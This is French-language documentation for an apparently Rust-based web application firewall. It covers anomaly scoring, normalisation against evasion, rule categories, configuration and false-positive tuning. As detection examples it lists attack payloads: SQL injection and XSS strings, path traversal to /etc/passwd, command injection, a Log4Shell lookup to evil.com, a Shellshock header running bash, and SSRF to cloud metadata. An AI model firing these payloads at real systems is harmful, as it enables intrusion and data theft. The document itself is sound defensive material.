---
title: Pare-feu applicatif (WAF)
summary: Un WAF à score d'anomalies qui arrête injections SQL, XSS, traversées de répertoires, injections de commandes, Log4Shell, SSRF et scanners en 2 µs environ par requête.
category: threats
order: 1
---

`Waf` est un pare-feu applicatif web à signatures, inspiré de l'OWASP Core Rule Set (CRS). Il normalise chaque entrée pour déjouer les techniques d'évasion courantes, la confronte en une seule passe à quelques centaines de signatures soigneusement choisies, et bloque la requête dès que le score d'anomalie cumulé atteint un seuil. Il fait partie de tous les préréglages (`Shield::recommended()`, `Shield::strict()`, `Shield::api()`) : la plupart des applications sont donc protégées sans écrire une seule ligne de configuration.

## Menaces couvertes

| Catégorie | Charge typique | OWASP Top 10 (2021) |
|---|---|---|
| Injection SQL | `' OR '1'='1`, `UNION SELECT`, `WAITFOR DELAY` | A03 Injection |
| Cross-site scripting | `<script>`, `onerror=`, `javascript:` | A03 Injection |
| Traversée de répertoires / LFI | `../../etc/passwd`, `php://filter` | A01 Broken Access Control |
| Injection de commandes système | `;cat /etc/passwd`, `$(whoami)` | A03 Injection |
| Log4Shell, Spring4Shell, Shellshock | `${jndi:ldap://…}`, `() { :; };` | A06 Vulnerable and Outdated Components |
| SSRF / inclusion de fichiers distants | `169.254.169.254`, `gopher://` | A10 Server-Side Request Forgery |
| Injection NoSQL | `user[$ne]=admin` | A03 Injection |
| Injection de templates côté serveur | `{{7*7}}`, `__class__` | A03 Injection |
| Sondes de scanners | `/.env`, `/.git/config`, `/wp-login.php` | A05 Security Misconfiguration |
| Attaques protocolaires | Injection d'en-têtes CRLF, octets NUL | A03 Injection |

> **Attention :** un WAF est une défense en profondeur, pas un correctif. Continuez à utiliser des requêtes paramétrées, un encodage des sorties adapté au contexte et une validation stricte des entrées : les signatures réduisent la surface d'attaque et vous font gagner du temps lorsqu'une vulnérabilité est publiée, mais un attaquant déterminé finira par construire une charge qu'aucune règle ne reconnaît.

## Fonctionnement

### Score d'anomalies

Chaque règle porte un score. Les signatures critiques comme `union select` ou `<script` valent 5 et bloquent à elles seules ; les indicateurs plus faibles comme `<img` (3) ou `alert(` (4) ne bloquent qu'en combinaison avec une autre correspondance. La requête est rejetée lorsque le total atteint le seuil (5 par défaut). Chaque règle ne compte qu'une fois par requête, même si elle correspond à plusieurs endroits.

Une requête bloquée reçoit `403 Forbidden` avec le code `waf_blocked`. Le score, les identifiants de règles et les catégories sont consignés dans la piste d'audit (voir [les événements de sécurité](/docs/events-stats)), mais jamais envoyés au client.

### Ce qui est inspecté

Le pare-feu ne voit que l'en-tête de la requête : le chemin de l'URL, la chaîne de requête et les valeurs des en-têtes. Quelques en-têtes bruyants ou porteurs d'identifiants sont ignorés par défaut (`authorization`, `proxy-authorization`, `accept`, `accept-encoding`, `accept-language`, `content-length`, `content-type`, `if-none-match`, `if-modified-since`, `sec-ch-ua`, `sec-ch-ua-platform`, `sec-ch-ua-mobile`). Les corps de requête s'inspectent à la demande depuis vos handlers avec `inspect_body` / `inspect_text` (voir plus bas).

### Niveaux de paranoïa

| Niveau | Ajoute | Recommandé pour |
|---|---|---|
| `Paranoia::Low` (1, par défaut) | Signatures très fiables notées de 3 à 5, plus les heuristiques de gestionnaires d'événements, de commandes shell et de CRLF | Toutes les applications ; utilisé par les préréglages `recommended` et `api` |
| `Paranoia::Medium` (2) | Indicateurs plus faibles notés de 1 à 3 : `select * from`, `--`, `char(`, `<form`, `src=`, `127.0.0.1`, `{{`, `.php` ou `.bak` dans les chemins | Back-offices sensibles ; utilisé par le préréglage `strict` |
| `Paranoia::High` (3) | Indicateurs très agressifs d'un seul caractère : `'`, `#`, `<`, `>`, le mot `or`, `localhost`, `.old` | API internes au trafic prévisible ; prévoyez des réglages |

### Normalisation

Avant la recherche de signatures, chaque entrée passe par les étapes suivantes, si bien qu'une seule signature couvre de nombreuses écritures de la même attaque :

| Étape | Évasion déjouée | Exemple d'entrée | Après normalisation |
|---|---|---|---|
| Décodage des pourcentages, deux fois si nécessaire | Double encodage d'URL | `%253Cscript` | `<script` |
| `+` décodé en espace (chaîne de requête et corps) | Encodage de formulaire | `1+OR+1%3D1` | `1 or 1=1` |
| Décodage des entités HTML (nommées, décimales, hexadécimales) | Contrebande par entités | `&lt;script&gt;`, `&#x3c;svg` | `<script>`, `<svg` |
| Suppression des commentaires SQL, y compris MySQL `/*!50000 … */` | Commentaires en ligne | `UNION/**/SELECT` | `union select` |
| Suites de blancs réduites à une espace | Remplissage par tabulations et sauts de ligne | `UNION%09%0A SELECT` | `union select` |
| Espaces supprimées autour de `;` `&` `(` `)` `=` `,` et du pipe | Espacement des opérateurs | `sleep (5)` | `sleep(5)` |
| Passage en minuscules compatible Unicode | Casse mélangée | `UnIoN SeLeCt` | `union select` |

Vous pouvez observer le résultat avec `securite::waf::normalize(input, is_query)`.

### Identifiants de règles et catégories

| Identifiants | `Category` | Nom dans les journaux | Exemples |
|---|---|---|---|
| 100–172 | `SqlInjection` | `sqli` | `union select`, `' or '1'='1`, `information_schema`, `waitfor delay` |
| 200–257 | `Xss` | `xss` | `<script`, `javascript:`, `document.cookie`, 245 = heuristique de gestionnaire d'événement `on…=` |
| 300–332 | `PathTraversal` | `traversal` | `../`, `/etc/passwd`, `php://`, `.htaccess` |
| 400–450 | `CommandInjection` | `cmdi` | `/bin/sh`, `${ifs}`, 450 = séparateur shell suivi d'une commande (`;cat `, `&&wget `…) |
| 500–519 | `RemoteCodeExecution` | `rce` | `${jndi:`, `class.module.classloader`, `() { :;` |
| 600–623 | `Ssrf` | `ssrf` | `169.254.169.254`, `metadata.google.internal`, `gopher://` |
| 700–714 | `NoSqlInjection` | `nosqli` | `[$ne]`, `[$where]`, `"$regex"` |
| 800–822 | `TemplateInjection` | `ssti` | `{{7*7}}`, `{{config`, `__subclasses__` |
| 900–948 | `ScannerProbe` | `scanner` | `/.env`, `/.git/`, `/wp-login.php` (chemin uniquement) |
| 1000–1001 | `Protocol` | `protocol` | octet NUL, 1001 = CRLF suivi d'un nom d'en-tête |
| vos identifiants | `Custom` | `custom` | règles ajoutées avec `custom_rule` |

`Category` et le module `target` se trouvent dans `securite::waf` (ils ne font pas partie du prélude). `waf.rules()` renvoie les règles actives avec leur motif, leur score, leur niveau de paranoïa et leurs cibles.

## Démarrage rapide

```rust
use axum::{routing::get, Router};
use securite::prelude::*;

let app: Router = Router::new()
    .route("/search", get(|| async { "results" }))
    .layer(
        Shield::builder()
            .guard(RequestId::new())
            .guard(Waf::new())
            .build(),
    );
```

Pour personnaliser le pare-feu d'un préréglage, ajoutez votre propre `Waf` : un guard portant le même nom remplace celui du préréglage.

```rust
use securite::prelude::*;

let shield = ShieldBuilder::recommended()
    .guard(Waf::new().paranoia(Paranoia::Medium))
    .build();
```

## Configuration

| Méthode | Défaut | Description |
|---|---|---|
| `Waf::new()` | paranoïa `Low`, seuil 5, toutes les règles intégrées | Crée le pare-feu (`Waf::default()` est équivalent). |
| `.paranoia(Paranoia)` | `Paranoia::Low` | Niveau de sensibilité ; les niveaux supérieurs activent des règles plus bruyantes. |
| `.threshold(u32)` | `5` | Score d'anomalie à partir duquel une requête est bloquée (minimum 1). |
| `.disable_rules(ids)` | aucune | Désactive des règles par identifiant (tout `IntoIterator<Item = u16>`). |
| `.disable_category(Category)` | aucune | Désactive toutes les règles intégrées d'une catégorie, heuristiques comprises. |
| `.custom_rule(id, pattern, score, targets)` | aucune | Ajoute une règle de sous-chaîne insensible à la casse dans `Category::Custom`, active à tous les niveaux de paranoïa. |
| `.skip_paths(prefixes)` | aucun | Préfixes de chemins qui ne sont pas inspectés du tout. |
| `.inspect_headers(bool)` | `true` | Inspecte les valeurs des en-têtes. |
| `.skip_headers(names)` | voir plus haut | Noms d'en-têtes jamais inspectés, ajoutés à la liste par défaut. |
| `.monitor()` | blocage | Signale les attaques sans les bloquer. |

API d'inspection, utilisable partout dans votre code :

| Méthode | Renvoie | Description |
|---|---|---|
| `.inspect(&request::Parts)` | `Verdict` | Évalue un en-tête de requête exactement comme le guard. |
| `.inspect_body(&str)` | `Verdict` | Évalue un texte quelconque avec les règles qui ciblent `BODY`. |
| `.inspect_text(&str)` | `Verdict` | Alias de `inspect_body`. |
| `.rules()` | `&[Rule]` | Les règles actives (intégrées et personnalisées). |

### Cibles

Une règle ne s'applique qu'aux entrées listées dans son masque de cibles. Les constantes de `securite::waf::target` se combinent avec l'opérateur OU bit à bit :

```rust
use securite::prelude::*;
use securite::waf::target;

// target::PATH     URL path
// target::QUERY    query string
// target::HEADERS  header values
// target::BODY     text passed to inspect_body / inspect_text
// target::ARGS     everything but the path
// target::ALL      everything
let waf = Waf::new()
    // An internal codename that must never reach the application.
    .custom_rule(5000, "project-nightingale", 5, target::ALL)
    // A weak signal: only blocks when combined with another match.
    .custom_rule(5001, "debug=true", 2, target::QUERY | target::BODY);
```

## Exemples de charges bloquées

Avec la configuration par défaut (paranoïa `Low`, seuil 5) :

```text
GET /search?q=1' OR '1'='1                           sqli        rule 105
GET /search?q=1 UNION SELECT password FROM users     sqli        rule 100
GET /search?q=%2527%2520OR%25201%253D1               sqli        rule 103 (double-encoded)
GET /?q=<script>alert(1)</script>                    xss         rules 200, 201, 229
GET /?q=<img src=x onerror=alert(1)>                 xss         rules 212, 245, 229
GET /download?file=../../../../etc/passwd            traversal   rules 300, 302
GET /?ip=127.0.0.1|whoami                            cmdi        rule 450
GET /?x=${jndi:ldap://evil.com/a}                    rce, ssrf   rules 500, 501, 609
GET /?url=http://169.254.169.254/latest/meta-data/   ssrf        rule 600
GET /login?user[$ne]=admin                           nosqli      rule 700
GET /?name={{7*7}}                                   ssti        rule 800
GET /.env                                            scanner     rule 900
GET /?q=a%0d%0aSet-Cookie:%20x=1                     protocol    rule 1001
User-Agent: () { :; }; /bin/bash -c id               rce, cmdi   rules 516, 401
```

Le trafic ordinaire, comme `/blog/2024/10/union-of-sets-in-rust`, `/search?q=what%27s+new+in+rust`, `/?q=C%2B%2B+vs+Rust` ou `/?title=Tom+%26+Jerry`, passe sans encombre.

## Inspecter les corps dans les handlers

Les guards ne voient que l'en-tête de la requête : les documents JSON, champs de formulaire ou requêtes GraphQL s'inspectent donc depuis vos handlers. Partagez le même `Waf` (il se clone à moindre coût) entre le shield et l'état de votre application :

```rust
use axum::{extract::State, http::StatusCode, routing::post, Json, Router};
use securite::prelude::*;
use serde::Deserialize;

#[derive(Clone)]
struct AppState {
    waf: Waf,
}

#[derive(Deserialize)]
struct NewComment {
    author: String,
    text: String,
}

async fn create_comment(
    State(state): State<AppState>,
    Json(comment): Json<NewComment>,
) -> StatusCode {
    // Inspect the decoded values, not the raw JSON text.
    for field in [&comment.author, &comment.text] {
        let verdict = state.waf.inspect_text(field);
        if verdict.blocked {
            tracing::warn!(score = verdict.score, rules = ?verdict.rules, "comment rejected by the WAF");
            return StatusCode::UNPROCESSABLE_ENTITY;
        }
    }
    // ... store the comment
    StatusCode::CREATED
}

let waf = Waf::new();
let app: Router = Router::new()
    .route("/comments", post(create_comment))
    .with_state(AppState { waf: waf.clone() })
    .layer(Shield::builder().guard(waf).build());
```

Un `Verdict` expose tout ce que le pare-feu a décidé :

```rust
use securite::prelude::*;
use securite::waf::{Category, Verdict};

let waf = Waf::new();
let verdict: Verdict = waf.inspect_text("1' UNION/**/SELECT password FROM users--");

assert!(verdict.blocked); // score reached the threshold
assert!(verdict.score >= 5); // total anomaly score
assert!(verdict.categories.contains(&Category::SqlInjection));
println!("score={} rules={:?}", verdict.score, verdict.rules); // score=8 rules=[143, 100]
```

> **Attention :** inspectez les valeurs désérialisées plutôt que le corps JSON brut. La normalisation décode l'encodage d'URL et les entités HTML, pas les échappements JSON : `"\u003cscript\u003e"` passerait inaperçu dans un document brut, alors que la chaîne décodée `<script>` est détectée.

## Corriger les faux positifs

Partez de la piste d'audit : chaque blocage consigne `score=… rules=[…] categories=…`. Appliquez ensuite la correction la plus ciblée possible :

```rust
use securite::prelude::*;
use securite::waf::Category;

let waf = Waf::new()
    .paranoia(Paranoia::Medium)
    // Rule 157 ("--") clashes with our search syntax: `rust --unsafe`.
    .disable_rules([157])
    // Strapi-style filters such as filters[price][$gt]=10, and no MongoDB behind them.
    .disable_category(Category::NoSqlInjection)
    // Internal SQL console for DBAs, already protected by Auth and an IP allow-list.
    .skip_paths(["/admin/sql-console"])
    // Users search for code snippets, which then show up in the Referer header.
    .skip_headers(["referer"]);
```

- `disable_rules` est le scalpel : une règle, partout.
- `disable_category` retire une famille entière, pour les menaces qui ne concernent pas votre pile technique.
- `skip_paths` désactive le pare-feu pour des préfixes de chemins (comparés par segments : `/admin` couvre `/admin/users`, pas `/administrator`). Gardez ces préfixes aussi étroits que possible et protégez-les autrement.
- `skip_headers` ignore certains en-têtes ; `inspect_headers(false)` les ignore tous, ce qui revient aussi à renoncer à détecter les charges Log4Shell et Shellshock cachées dans `User-Agent` ou `Referer`.
- `threshold` relève la barre pour toutes les règles à la fois ; préférez les options précédentes.

## Déploiement progressif en mode surveillance

Sur une application existante, commencez en [mode surveillance](/docs/monitor-mode) : rien n'est bloqué, mais chaque requête qui l'aurait été est journalisée au niveau INFO sous la cible `securite`, transmise à votre hook `on_event` avec `enforced == false`, et comptée dans `StatsSnapshot::monitored`.

```rust
use securite::prelude::*;

let shield = ShieldBuilder::recommended()
    // Same name as the preset WAF, so this one replaces it.
    .guard(Waf::new().paranoia(Paranoia::Medium).monitor())
    .on_event(|e| {
        if e.guard == "waf" && !e.enforced {
            // details look like: score=8 rules=[143, 100] categories=sqli
            tracing::info!(path = e.path, details = e.details, "the WAF would have blocked this request");
        }
    })
    .build();
```

1. Déployez en mode surveillance et collectez une période de trafic représentative (une semaine ouvrée complète est un bon début).
2. Regroupez les détections par identifiant de règle et examinez-les : vraies attaques ou trafic légitime ?
3. Ajustez avec `disable_rules`, `skip_paths` ou `skip_headers`.
4. Retirez `.monitor()` et continuez à surveiller le compteur de blocages.

> **Astuce :** pour évaluer un niveau de paranoïa plus strict pendant que le niveau actuel continue de bloquer, ajoutez un second pare-feu en mode surveillance comme couche autonome sous votre shield : `router.layer(Waf::new().paranoia(Paranoia::High).monitor()).layer(shield)`. Ses détections sont journalisées sous la cible tracing `securite`.

## Utilisation comme couche autonome

Comme tous les guards, `Waf` est à lui seul une couche tower :

```rust
use axum::{routing::get, Router};
use securite::prelude::*;

let app: Router = Router::new()
    .route("/", get(|| async { "home" }))
    .layer(Waf::new().paranoia(Paranoia::Medium));
```

Une couche autonome construit un shield interne avec les réglages par défaut : erreurs au format problem+json, IP client lue sur le pair TCP, journalisation activée, et aucun accès à votre hook `on_event` ni à vos statistiques. Enregistrez le WAF dans votre `Shield` lorsque vous en avez besoin.

## Performances

Toutes les signatures actives sont compilées en un unique automate Aho-Corasick (DFA) au moment de la configuration du pare-feu. Chaque entrée est normalisée une fois puis parcourue en une seule passe linéaire : le coût n'augmente pas avec le nombre de règles. Dans les benchmarks du crate (`cargo bench -p securite`), l'inspection d'une requête de navigateur typique, avec une chaîne de requête et une demi-douzaine d'en-têtes, prend environ 2 µs, que la requête soit saine ou malveillante. Les chiffres varient selon votre matériel.

L'inspection d'un corps est linéaire en sa taille : plafonnez la taille des requêtes avec `BodyLimit` avant d'inspecter de gros documents.

## Pièges et conseils

- Configurez le pare-feu une seule fois, au démarrage. Chaque appel du builder recompile l'automate ; ensuite, cloner un `Waf` ne coûte presque rien, car le moteur compilé est partagé.
- Un `Shield` contient un seul guard par nom : un second `Waf` remplace le premier.
- Les motifs personnalisés sont comparés au texte normalisé. Écrivez-les en minuscules, avec des espaces simples et sans espace autour de `;`, `&`, `(`, `)`, `=` et `,`, sinon ils ne correspondront jamais.
- Choisissez des identifiants de règles personnalisées à partir de 5000. Réutiliser un identifiant intégré fait agir `disable_rules` sur les deux règles, et le score n'est compté qu'une fois.
- `inspect_text` renvoie le verdict brut : il ignore le mode surveillance et `skip_paths`, n'émet aucun événement de sécurité et ne met pas à jour les statistiques. C'est à votre handler de décider quoi faire et de le journaliser.
- Le WAF s'exécute après la limitation de débit et le blocage des robots, si bien que les rafales et les scanners connus sont écartés d'abord par des contrôles moins coûteux, et avant les contrôles CSRF et l'authentification.
- Associez-le au [bannissement automatique](/docs/auto-ban) : chaque blocage du WAF compte comme une pénalité, et les attaquants obstinés finissent bannis.

## Pages associées

- [Blocage des robots](/docs/bot-blocker)
- [Mode surveillance](/docs/monitor-mode)
- [Événements de sécurité et statistiques](/docs/events-stats)
- [Format des réponses d'erreur](/docs/error-format)
- [Bannissement automatique](/docs/auto-ban)
- [Hygiène HTTP](/docs/hygiene)
